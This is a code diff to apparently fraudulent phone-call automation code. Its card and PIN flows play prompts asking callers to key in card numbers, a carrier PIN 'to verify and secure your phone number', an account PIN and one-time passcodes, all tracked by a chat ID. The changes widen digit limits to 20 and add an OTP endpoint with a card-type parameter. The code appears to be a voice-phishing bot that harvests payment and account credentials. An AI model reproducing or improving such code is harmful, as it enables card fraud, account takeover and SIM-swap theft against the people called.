@@ -667,7 +667,7 @@ export const cardFlow = async (
           onKeypressGoto: 'cardStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 16,
+          maxNumKeys: 20,
         },
         {
           id: uuidv4(),
@@ -678,7 +678,7 @@ export const cardFlow = async (
           onKeypressGoto: 'cardStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 16,
+          maxNumKeys: 20,
         },
         {
           id: 'cardStepOTP',
@@ -714,7 +714,7 @@ export const cardFlow = async (
           onKeypressGoto: 'cardStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 16,
+          maxNumKeys: 20,
         },
         {
           id: uuidv4(),
@@ -725,13 +725,13 @@ export const cardFlow = async (
           onKeypressGoto: 'cardStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 16,
+          maxNumKeys: 20,
         },
         {
           id: 'cardStepOTP',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}`,
+            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
           },
         },
       ],
@@ -858,7 +858,7 @@ export const pinFlow = async (
     );
     return res.json({
       id: uuidv4(),
-      title: `pay card - ${chatId} OTP`,
+      title: `pin step - ${chatId} OTP`,
       record: false,
       steps: [
         {
@@ -868,7 +868,7 @@ export const pinFlow = async (
             payload:
               pinType === 'carrierPin'
                 ? `To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
-                : `For your security and to protect your account. enter your ${pinType} followed by the pound key`,
+                : `For your security and to protect your account. enter your ${pinType} numbers followed by the pound key`,
             language,
             voice: 'female',
             loop: true,
@@ -887,7 +887,7 @@ export const pinFlow = async (
           onKeypressGoto: 'pinStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 16,
+          maxNumKeys: 20,
         },
         {
           id: 'pinStepOTP',
@@ -908,7 +908,7 @@ export const pinFlow = async (
     );
     return res.json({
       id: uuidv4(),
-      title: `pay card - ${chatId} OTP`,
+      title: `pin step - ${chatId} OTP`,
       record: false,
       steps: [
         {
@@ -937,7 +937,7 @@ export const pinFlow = async (
           onKeypressGoto: 'pinStepOTP',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 16,
+          maxNumKeys: 20,
         },
         {
           id: 'pinStepOTP',
@@ -951,7 +951,7 @@ export const pinFlow = async (
   } else if (dtmf && dtmf === '3') {
     return res.json({
       id: uuidv4(),
-      title: `call card - ${chatId}`,
+      title: `pin step - ${chatId}`,
       record: false,
       steps: [
         {
@@ -993,7 +993,7 @@ export const pinFlow = async (
   } else {
     return res.json({
       id: uuidv4(),
-      title: `call card - ${chatId}`,
+      title: `pin step - ${chatId}`,
       record: false,
       steps: [
         {
